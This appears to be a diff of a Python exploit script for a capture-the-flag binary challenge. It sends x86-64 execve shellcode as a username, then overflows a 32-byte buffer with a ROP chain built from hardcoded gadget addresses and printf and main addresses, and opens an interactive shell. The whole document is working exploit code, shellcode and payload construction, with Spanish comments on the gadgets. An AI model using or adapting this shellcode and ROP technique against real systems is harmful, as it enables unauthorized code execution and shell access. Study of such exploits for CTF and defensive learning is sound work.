@@ -83,26 +83,33 @@ def interactive():
 
 def main():
     shellcode = "\x31\xC0\x99\x48\xBB\xD1\x9D\x96\x91\xD0\x8C\x97\xFF\x48\xF7\xDB\x53\x54\x5F\x31\xF6\xB0\x3B\x0F\x05"
+    main_addr = p64(0x4008b1)
+    printf_addr = p64(0x400640)
+    obj_o_addr = p64(0x602098) #obj.o + 0x20 -> nombre
+
     recvuntil("hey, what's your name? : ")
-    sendline('username')
+    sendline(shellcode)
     recvuntil("> ")
     sendline('1')
     pad      = 'A' * 32
     payload  = ''
-    payload += p64(1) # rbp
-    payload += p64(0x400761) # : pop rbx ; pop rbp ; ret
-    payload += p64(1) # rbx
-    payload += p64(1) # rbp
-    payload += p64(0x400aea) # call qword ptr [rsp + rbx*8] -> tiene un \n no funca
-    payload += "\x90" * 8
-    payload += shellcode
+    payload += p64(0) # rbp
+    payload += p64(0x400b00) # mov r12, qword ptr [rsp + 0x18] ; mov r13, qword ptr [rsp + 0x20] ; mov r14, qword ptr [rsp + 0x28] ; mov r15, qword ptr [rsp + 0x30] ; add rsp, 0x38 ; ret
+    payload += 'A' * (8 * 3)
+    payload += 'D' * 8 # r12 -> call addr
+    payload += 'E' * 8 # r13 -> edi
+    payload += 'F' * 8 # r14
+    payload += 'G' * 8 # r15
+    payload += p64(0x400ae6) # mov edi, r13d ; call qword ptr [r12 + rbx*8] -> tiene \x0a...
+    payload += printf_addr
+    payload += main_addr
     sendline(pad + payload)
     interactive()
+
+    # 0x0000000000400ae6 : mov edi, r13d ; call qword ptr [r12 + rbx*8]
 
 if __name__ == '__main__':
     try:
         main()
     except KeyboardInterrupt:
         pass
-
-
